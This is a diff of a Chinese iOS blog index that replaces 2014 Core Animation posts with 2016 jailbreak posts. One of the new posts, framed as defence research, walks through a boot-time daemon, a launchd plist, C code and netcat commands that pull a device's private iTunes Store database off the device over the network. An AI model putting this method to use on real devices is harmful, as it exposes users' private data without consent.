-	<div class="entry-content">
-		<p>在2007年，乔布斯在第一次介绍 iPhone 的时候，iPhone 的触摸屏交互简直就像是一种魔法。最好的例子就是在他<a href="https://www.youtube.com/watch?v=t4OEsI0Sc_s&amp;t=16m9s">第一次滑动 TableView 的展示上</a>。你可以感受到当时观众的反应是多么惊讶，但是对于现在的我们来说早已习以为常。在展示的后面一部分，他特别指出当他给别人看了这个滑动例子，别人说的一句话: <a href="https://www.youtube.com/watch?v=t4OEsI0Sc_s&amp;t=16m9s">“当这个界面滑动的时候我就已经被征服了”</a>.</p>
-
-<p>是什么样的滑动能让人有‘哇哦’的效果呢？</p>
-
-<p>滑动是最完美地展示了通过触摸屏直接操作的例子。滚动视图遵从于你的手指，当你的手指离开屏幕的时，视图会自然地继续滑动直到该停止的时候停止。它用自然的方式减速，甚至在快到界限的时候也能表现出细腻的弹力效果。滑动在任何时候都保持相应，并且看上去非常真实。</p>
-
-<h2>动画的状态</h2>
-
-<p>在 iOS 中的大部分动画仍然没有按照最初 iPhone 指定的滑动标准实现。这里有很多动画一旦它们运行就不能交互（比如说解锁动画，主界面中打开文件夹和关闭文件夹的动画，和导航栏切换的动画，还有很多）。</p>
-
-<p>然而现在有一些应用给我一种始终在控制动画的体验，我们可以直接操作那些我在用的动画。当我们将这些应用和其他的应用相比较之后，我们就能感觉到明显的区别。这些应用中最优秀的有最初的 Twitter iPad app， 和现在的 Facebook Paper。但目前，使用直接操作为主并且可以中断动画的应用仍然很少。这就给我们做出更好的应用提供了机会，让我们的应用有更不同的，更高质量的体验。</p>
-
-<h2>真实交互式动画的挑战</h2>
-
-<p>当我们用 UIView 或者 CAAnimation 来实现交互式动画时会有两个大问题: 这些动画会将你在屏幕上的内容和 layer 上的实际的特定属性分离开来，并且他们直接操作这些特定属性。</p>
-
-<h3 id="modelpresentation">模型 (Model) 和显示 (Presentation) 的分离</h3>
-
-<p>Core Animation 是通过分离 layer 的模型属性和你在屏幕上看到的界面 (显示层) 的方式来设计的，这就导致我们很难去创建一个可以在任何时候能交互的动画，因为在动画时，模型和界面已经不能匹配了。这时，我们不得不通过手动的方式来同步这两个的状态，来达到改变动画的效果：</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">view</span><span class="p">.</span><span class="n">layer</span><span class="p">.</span><span class="n">center</span> <span class="o">=</span> <span class="n">view</span><span class="p">.</span><span class="n">layer</span><span class="p">.</span><span class="n">presentationLayer</span><span class="p">.</span><span class="n">center</span><span class="p">;</span>
-</span><span class="line"><span class="p">[</span><span class="n">view</span><span class="p">.</span><span class="n">layer</span> <span class="nl">removeAnimationForKey:</span><span class="s">@&quot;animation&quot;</span><span class="p">];</span>
-</span><span class="line"><span class="c1">// 添加新动画</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<h3 id="vs">直接控制 vs 间接控制</h3>
-
-<p><code>CAAnimation</code> 动画的更大的问题是它们是直接在 layer 上对属性进行操作的。这意味着什么呢？比如我们想指定一个 layer 从坐标为 (100, 100) 的位置运动到 (300, 300) 的位置，但是在它运动到中间的时候，我们想它停下来并且让它回到它原来的位置，事情就变得非常复杂了。如果你只是简单地删除当前的动画然后再添加一个新的，那么这个 layer 的速率就会不连续。</p>
-
-<p><img src="http://img.objccn.io/issue-12/abrupt.png" width="600" /></p>
-
-<p>然而，我们想要的是一个漂亮的，流畅地减速和加速的动画。</p>
-
-<p><img src="http://img.objccn.io/issue-12/smooth.png" width="600" /></p>
-
-<p>只有通过<em>间接</em>操作动画才能达到上面的效果，比如通过模拟力在界面上的表现。新的动画需要用 layer 的当前<em>速度矢量</em>作为参数传入来达到流畅的效果。</p>
-
-<p>看一下 UIView 中关于弹簧动画的 API </p>
-<p>animateWithDuration:delay:usingSpringWithDamping:initialSpringVelocity:options:animations:completion:</p>
-<p>，你会注意到速率是个 CGFloat。所以当我们给一个移动 view 的动画在其运动的方向上加一个初始的速率时，你没法告知动画这个 view 现在的运动状态，比如我们不知道要添加的动画的方向是不是和原来的 view 的速度方向垂直。为了使其成为可能，这个速度需要用向量来表示。</p>
-
-<h2>解决方案</h2>
-
-		
-		<a href="/Blog/blog/2014/05/23/jiao-hu-shi-dong-hua/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2014/05/23/jiao-hu-shi-dong-hua/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2014/05/18/iosdong-hua-jie-shi/">
-		
-			iOS动画解释</a>
-	</h2>
-	<div class="entry-content">
-		<p>我们写的应用程序往往都不是静态的，因为它们需要适应用户的需求以及为执行各种任务而改变状态。</p>
-
-<p>在这些状态之间转换时，清晰的揭示正在发生什么是非常重要的。而不是在页面之间跳跃，动画帮助我们解释用户从哪里来，要到哪里去。</p>
-
-<p>键盘在 view 中滑进滑出给了我们一个错觉，让我们以为它是简单的被隐藏在屏幕下方的，并且是手机很自然的一个部分。View controller 转场加强了我们的应用程序的导航结构，并且给了用户正在移向哪个方向的提示。微妙的反弹和碰撞使界面栩栩如生，并且激发出了物理的质感。要是没有这些的话，我们就只有一个没有视觉修饰的干巴巴环境了。</p>
-
-<p>动画是叙述你的应用的故事的绝佳方式，在了解动画背后的基本原理之后，设计它们会轻松很多。</p>
-
-<h2>首要任务</h2>
-
-<p>在这篇文章 (以及这个话题中其余大多数文章) 中，我们将特别地针对 Core Animation 进行探讨。虽然你将看到的很多东西也可以用更高层级的 UIKit 的方法来完成，但是 Core Animation 将会让你更好的理解正在发生什么。它以一种更明确的方式来描述动画，这对这篇文章读者以及你自己的代码的读者来说都非常有用。</p>
-
-<p>在看动画如何与我们在屏幕上看到的内容交互之前，我们需要快速浏览一下 Core Animation 的 <code>CALayer</code>，这是动画产生作用的地方。</p>
-
-<p>你大概知道 <code>UIView</code> 实例，以及 layer-backed 的 <code>NSView</code>，修改它们的 <code>layer</code> 来委托强大的 Core Graphics 框架来进行渲染。然而，你务必要理解，当把动画添加到一个 layer 时，是不直接修改它的属性的。</p>
-
-<p>取而代之，Core Animation 维护了两个平行 layer 层次结构： <em>model layer tree（模型层树）</em> 和 <em>presentation layer tree（表示层树）</em>。前者中的 layers 反映了我们能直接看到的 layers 的状态，而后者的 layers 则是动画正在表现的值的近似。</p>
-
-<blockquote>
-  <p>实际上还有所谓的第三个 layer 树，叫做 <em>rendering tree（渲染树）</em>。因为它对 Core Animation 而言是私有的，所以我们在这里不讨论它。</p>
-</blockquote>
-
-<p>考虑在 view 上增加一个渐出动画。如果在动画中的任意时刻，查看 layer 的 <code>opacity</code> 值，你是得不到与屏幕内容对应的透明度的。取而代之，你需要查看 presentation layer 以获得正确的结果。</p>
-
-<p>虽然你可能不会去直接设置 presentation layer 的属性，但是使用它的当前值来创建新的动画或者在动画发生时与 layers 交互是非常有用的。</p>
-
-<p>通过使用 <code>-[CALayer presentationLayer]</code> 和 <code>-[CALayer modelLayer]</code>，你可以在两个 layer 之间轻松切换。</p>
-
-<h2>基本动画</h2>
-
-<p>可能最常见的情况是将一个 view 的属性从一个值改变为另一个值，考虑下面这个例子：</p>
-
-<p><center><img src="http://img.objccn.io/issue-12/rocket-linear.gif" width="400px" /></center></p>
-
-<p>在这里，我们让红色小火箭的 x-position 从 <code>77.0</code> 变为 <code>455.0</code>，刚好超过它的 parent view 的边。为了填充所有路径，我们需要确定我们的火箭在任意时刻所到达的位置。这通常使用线性插值法来完成：</p>
-
-<p><center><img src="http://img.objccn.io/issue-12/lerp.png" width="135" /></center></p>
-
-<p>也就是说，对于动画给定的一个分数 <code>t</code>，火箭的 x 坐标就是起始点的 x 坐标 <code>77</code>，加上一个到终点的距离 <code>∆x = 378</code> 乘以该分数的值。</p>
-
-<p>使用 <code>CABasicAnimation</code>，我们可以如下实现这个动画：</p>
+<p>a.可以 ssh 登录到越狱机上，并且越狱机已安装了编辑器工具例如 nano，在 /Library/MobileSubstrate/DynamicLibraries/ 下创建文件 libReveal.plist ，指定 app 的 Bundle ，可以指定多个</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
 <span class="line-number">3</span>
 <span class="line-number">4</span>
 <span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">CABasicAnimation</span> <span class="o">*</span><span class="n">animation</span> <span class="o">=</span> <span class="p">[</span><span class="n">CABasicAnimation</span> <span class="n">animation</span><span class="p">];</span>
-</span><span class="line"><span class="n">animation</span><span class="p">.</span><span class="n">keyPath</span> <span class="o">=</span> <span class="s">@&quot;position.x&quot;</span><span class="p">;</span>
-</span><span class="line"><span class="n">animation</span><span class="p">.</span><span class="n">fromValue</span> <span class="o">=</span> <span class="err">@</span><span class="mi">77</span><span class="p">;</span>
-</span><span class="line"><span class="n">animation</span><span class="p">.</span><span class="n">toValue</span> <span class="o">=</span> <span class="err">@</span><span class="mi">455</span><span class="p">;</span>
-</span><span class="line"><span class="n">animation</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class="line">
-</span><span class="line"><span class="p">[</span><span class="n">rocket</span><span class="p">.</span><span class="n">layer</span> <span class="nl">addAnimation:</span><span class="n">animation</span> <span class="nl">forKey:</span><span class="s">@&quot;basic&quot;</span><span class="p">];</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">Filter</span> <span class="o">=</span> <span class="p">{</span>
+</span><span class="line">         <span class="n">Bundles</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;com.apple.AppStore&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="p">};</span>
+</span><span class="line"><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
+<p>b.也可以在本地创建好 libReveal.plist 在 scp 到指定位置 /Library/MobileSubstrate/DynamicLibraries/ 下</p>
+
+<h4>重启越狱机</h4>
+
+<p>a.执行 killall SpringBoard</p>
+
+<p>b.也可以重启设备</p>
+
+<p>然后就可以到 Reveal 看看别人的 app 怎么布局的了，苹果的appstore：</p>
+
+<div class="figure" id="figure-3-1">
+    <img src="http://ww2.sinaimg.cn/large/626e5d69gw1f75tvj27y1j21040s3woe.jpg" />
+
+    <p class="caption"><strong>图片 3.1</strong> reveal</p>
+</div>
+
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
 		
-		<a href="/Blog/blog/2014/05/18/iosdong-hua-jie-shi/" class="more-link">Read on &rarr;</a>
+		
 	</div>
 
 
@@ -590,9 +392,13 @@
 </div>
 	<div class="tags">
 
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
 </div>
 	
-	<div class="comments"><a href="/Blog/blog/2014/05/18/iosdong-hua-jie-shi/#disqus_thread">Comments</a></div>
+	<div class="comments"><a href="/Blog/blog/2016/08/25/revealcha-kan-app-ui/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
@@ -601,34 +407,72 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/Blog/blog/2014/05/16/zi-ding-yi-formatters/">
+		<a href="/Blog/blog/2016/08/24/lai-hu-%5B%3F%5D-zhou-nian-ji/">
 		
-			自定义Formatters</a>
+			来沪一周年纪</a>
 	</h2>
 	<div class="entry-content">
-		<p>我们希望有一种快速的一次性的解决方案，可以把数据格式化为一种易读的格式。Foundation 框架中的就有 <code>NSFormatter</code> 可以很好地胜任这个工作。另外，在 Mac 上，Appkit 已经内建了 <code>NSFormatter</code> 的支持。</p>
+		<h1>题记</h1>
+<p>不知不觉，来沪一周年。特发此文，总结来沪一周年的收获。
+</p>
+<p>
+</p>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
 
-<h2>内建格式器</h2>
+		
+		
+	</div>
 
-<p>Foundation 框架中的 <code>NSFormatter</code> 是一个抽象类，它有两个已经实现的子类：<code>NSNumberFormatter</code> 与 <code>NSDateFormatter</code>。现在我们先跳过这些，来实现我们自己的子类。</p>
 
-<p>如果你想了解更多的相关知识，我推荐阅读 <a href="http://nshipster.com/nsformatter/">NSHipster</a>。</p>
+<div class="meta">
+	<div class="date">
 
-<h2>介绍</h2>
 
-<p><code>NSFormatter</code> 除了抛出错误，其它什么事也不做。我还不知道有人想要用这个，当然如果它对你有用，就去用它吧。</p>
 
-<p>因为我们不喜欢错误，我们在此实现一个 <code>NSFormatter</code> 的子类，它可以把 <code>UIColor</code> 实例转换成可读的名字。例如，以下代码可以返回字符串“Blue”:</p>
 
-<pre><code>KPAColorFormatter *colorFormatter = [[KPAColorFormatter alloc] init];
-[colorFormatter stringForObjectValue:[UIColor blueColor]] // Blue
-</code></pre>
+</div>
+	<div class="tags">
 
-<p><code>NSFormatter</code> 的子类化有两个方法需要实现：<code>stringForObjectValue:</code> 与 <code>getObjectValue:ForString:errorDescription:</code>。我们先开始介绍第一个方法，因为这个方法更常用。第二个方法，就我所知，经常用于 OS X 上，并且通常不是很有用，我们将稍后介绍。</p>
 
-<h2>初始化</h2>
+	<a class='category' href='/Blog/blog/categories/gan-wu/'>感悟</a>
 
-<p>首先，我们需要做些初始化的工作。由于没有事先定义好的字典可以把颜色映射至名字，这些工作将由我们来完成。为了简化，这些工作将在初始化方法中完成：</p>
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/24/lai-hu-%5B%3F%5D-zhou-nian-ji/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/">
+		
+			如何非法窃取用户信息？</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">2</span> <span class="title">后台 daemon 非法窃取用户 iTunesstore 信息</span></h1>
+    <p>本人郑重声明：并不鼓励窃取用户隐私等行为，一切 hack 学习都只是为了研究如何防御。OK，进入正题。</p>
+
+<h3>开机自启动</h3>
+
+<p>在 <a href="/Blog/blog/2016/08/19/ioshei-ke-gong-ju/">iOS 黑客工具</a>中，介绍了如何编译自己的 C 程序并手动启动。今天介绍如何使程序变为开机自启动。</p>
+
+<h4>首先打开 Xcode 创建一个 plist 属性文件，如下图所示：</h4>
+
+<div class="figure" id="figure-2-1">
+    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f74ojhy4upj20gg06cq46.jpg" />
+
+    <p class="caption"><strong>图片 2.1</strong> daemon1</p>
+</div>
+
+
+<p>其中要注意一下通信服务名，我定为 55 。用编辑器打开，即为：</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -638,18 +482,150 @@
 <span class="line-number">6</span>
 <span class="line-number">7</span>
 <span class="line-number">8</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">init</span><span class="p">;</span>
-</span><span class="line"><span class="p">{</span>
-</span><span class="line">    <span class="k">return</span> <span class="p">[</span><span class="n">self</span> <span class="nl">initWithColors:</span><span class="err">@</span><span class="p">{</span>
-</span><span class="line">        <span class="p">[</span><span class="n">UIColor</span> <span class="n">redColor</span><span class="p">]</span><span class="o">:</span> <span class="s">@&quot;Red&quot;</span><span class="p">,</span>
-</span><span class="line">        <span class="p">[</span><span class="n">UIColor</span> <span class="n">blueColor</span><span class="p">]</span><span class="o">:</span> <span class="s">@&quot;Blue&quot;</span><span class="p">,</span>
-</span><span class="line">        <span class="p">[</span><span class="n">UIColor</span> <span class="n">greenColor</span><span class="p">]</span><span class="o">:</span> <span class="s">@&quot;Green&quot;</span>
-</span><span class="line">    <span class="p">}];</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+</pre></td><td class="code"><pre><code class="xml"><span class="line"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span class="line"><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
+</span><span class="line"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
+</span><span class="line"><span class="nt">&lt;dict&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>Program<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>StandardErrorPath<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;string&gt;</span>/dev/null<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>SessionCreate<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;true/&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>ProgramArguments<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;array&gt;</span>
+</span><span class="line">        <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/array&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>inetdCompatibility<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
+</span><span class="line">        <span class="nt">&lt;key&gt;</span>Wait<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">        <span class="nt">&lt;false/&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>Sockets<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
+</span><span class="line">        <span class="nt">&lt;key&gt;</span>Listeners<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">        <span class="nt">&lt;dict&gt;</span>
+</span><span class="line">            <span class="nt">&lt;key&gt;</span>SockServiceName<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">            <span class="nt">&lt;string&gt;</span>55<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">        <span class="nt">&lt;/dict&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
+</span><span class="line"><span class="nt">&lt;/dict&gt;</span>
+</span><span class="line"><span class="nt">&lt;/plist&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>最后，将 plist 文件 scp 至 <code>root@192.168.1.114:/System/Library/LaunchDaemons/</code>下 。</p>
+
+<h3>编写读取 iTunesstore 数据库程序</h3>
+
+<p>读取 itunesstored2.sqlitedb 信息，并输出到 stdout 中，便于我们读取。</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#include &lt;stdio.h&gt;  </span>
+</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"> <span class="err">#</span><span class="n">define</span> <span class="n">FILE</span> <span class="s">&quot;/var/mobile/Library/com.apple.itunesstored/itunesstored2.sqlitedb&quot;</span>
+</span><span class="line">
+</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+</span><span class="line">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class="line">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span class="line">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class="line">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span><span class="line">    <span class="k">while</span> <span class="p">((</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+</span><span class="line">        <span class="n">write</span><span class="p">(</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stdout</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class="line">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class="line"><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
+<h3>编译、拷贝、签名</h3>
+
+<h4>编译方法上篇文章已经介绍清楚，这里不再重复，直接 ￥%￥＃%￥……%＃ 生成运行在 ARM 的 ncdemo</h4>
+
+<h4>将 ncdemo scp 到设备中，并登录</h4>
+
+<div class="code code">
+<pre class="code">$ scp ncdemo root@192.168.1.114:ncdemo
+$ ssh root@192.168.1.114</pre>
+</div>
+
+<h4>签名</h4>
+
+<div class="code code">
+<pre class="code"> #ldid -S ncdemo
+ #mv ncdemo /usr/bin</pre>
+</div>
+
+<h3>抓取 iTunesstore 数据信息</h3>
+
+<p>这时，我们只需要利用 netcat，指定之前定义的服务名称，轻松在本地抓取设备 iTunesstore 信息.
+<code>$ nc 192.168.1.114 55 &gt; itunesstored2.sqlitedb</code></p>
+
+<h3>分析 iTunesstore 数据信息</h3>
+
+<p>好吧，这里就介绍个最简单的应用，利用string命令查看：
+<code>$ strings itunesstored2.sqlitedb</code></p>
+
+<p>于是乎，我们就清晰的得到了 iPhone/iPad 设备上都安装了哪些 app ：</p>
+
+<div class="figure" id="figure-2-2">
+    <img src="http://ww1.sinaimg.cn/large/626e5d69gw1f74ol56kfgj20df0gfgpo.jpg" />
+
+    <p class="caption"><strong>图片 2.2</strong> daemon2</p>
+</div>
+
+
+<p>当然，除了这些，你想干什么都可以……夜深了，先写到这里吧……</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
 		
-		<a href="/Blog/blog/2014/05/16/zi-ding-yi-formatters/" class="more-link">Read on &rarr;</a>
+		
 	</div>
 
 
@@ -668,7 +644,7 @@
 
 </div>
 	
-	<div class="comments"><a href="/Blog/blog/2014/05/16/zi-ding-yi-formatters/#disqus_thread">Comments</a></div>
+	<div class="comments"><a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
@@ -677,41 +653,180 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/Blog/blog/2014/05/14/xiao-xi-chuan-di-ji-zhi/">
+		<a href="/Blog/blog/2016/08/19/ioshei-ke-gong-ju/">
 		
-			消息传递机制</a>
+			iOS黑客工具</a>
 	</h2>
 	<div class="entry-content">
-		<p>每个应用或多或少都由一些需要相互传递消息的对象结合起来以完成任务。在这篇文章里，我们将介绍所有可用的消息传递机制，并通过例子来介绍怎样在苹果的框架里使用。我们还会选择一些最佳范例来介绍什么时候该用什么机制。</p>
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">1</span> <span class="title">Hack 必备的命令与工具</span></h1>
+    <h3>常用的命令和工具</h3>
 
-<p>虽然这一期的主题是关于 Foundation 框架的，但是我们会超出 Foundation 的消息传递机制 (KVO 和 通知) 来讲一讲 delegation，block 和 target-action 几种机制。</p>
+<p>ps              ——显示进程状态，CPU 使用率，内存使用情况等<br />
+sysctl       ——检查设定 Kernel 配置<br />
+netstat     ——显示网络连接，路由表，接口状态等<br />
+route        ——路由修改<br />
+renice       ——调整程序运行的优先级<br />
+ifconfig    ——查看网络配置<br />
+tcpdump   ——截获分析网络数据包<br />
+lsof           ——列出当前系统打开的文件列表，别忘记一切皆文件，包括网络连接、硬件等<br />
+otool ①     ——查看程序依赖哪些动态库信息，反编代码段……等等等等<br />
+nm ②        ——显示符号表<br />
+ldid ③      ——签名工具<br />
+gdb          ——调试工具
+patch       ——补丁工具<br />
+SSH         ——远程控制</p>
 
-<p>当然，有些情况下该使用什么机制没有唯一的答案，所以应该按照自己的喜好去试试。另外大多数情况下该使用什么机制应该是很清楚的。</p>
+<p>备注：
+① otool，可查看可执行程序都链接了那些库：
+ <code>otool  -L WQAlbum</code></p>
 
-<p>本文中，我们会常常提及“接收者”和“发送者”。它们在消息传递中的意思可以通过以下的例子解释：一个 table view 是发送者，它的 delegate 就是接收者。Core Data managed object context 是它所发出的 notification 的发送者，获取 notification 的就是接收者。一个滑块 (slider) 是 action 消息的发送者，而实现这个 action （方法）的是它的接收者。任何修改一个支持 KVO 的对象的对象是发送者，这个 KVO 对象的观察者就是接收者。明白精髓了吗？</p>
+<p>可以得到：</p>
 
-<h2>几种消息传递机制</h2>
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">WQAlbum:
+</span><span class="line">    /System/Library/Frameworks/StoreKit.framework/StoreKit (compatibility version 1.0.0, current version 1.0.0)
+</span><span class="line">    /System/Library/Frameworks/AdSupport.framework/AdSupport (compatibility version 1.0.0, current version 1.0.0)
+</span><span class="line">    /usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.5)
+</span><span class="line">    /System/Library/Frameworks//MediaPlayer.framework/MediaPlayer (compatibility version 1.0.0, current version 1.0.0)
+</span><span class="line">    /System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices (compatibility version 1.0.0, current version 40.0.0)
+</span><span class="line">    /System/Library/Frameworks/CoreMedia.framework/CoreMedia (compatibility version 1.0.0, current version 1.0.0)
+</span><span class="line">……</span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>首先我们来看看每种机制的具体特点。在这个基础上，下一节我们会画一个流程图来帮我们在具体情况下正确选择应该使用的机制。最后，我们会介绍一些苹果框架里的例子并且解释为什么在那些用例中会选择这样的机制。</p>
+<p>可以反编译 WQAlbum 的 <code>__TEXT__</code> 段内容, 截前 10 行：
+<code>otool -tV WQAlbum |head -n 10</code></p>
 
-<h3 id="kvo">KVO</h3>
+<p>可以得到：</p>
 
-<p>KVO 是提供对象属性被改变时的通知的机制。KVO 的实现在 Foundation 中，很多基于 Foundation 的框架都依赖它。想要了解更多有关 KVO 的最佳实践，请阅读本期 Daniel 写的 <a href="http://objccn.io/issue-7-3">KVO 和 KVC 文章</a>。</p>
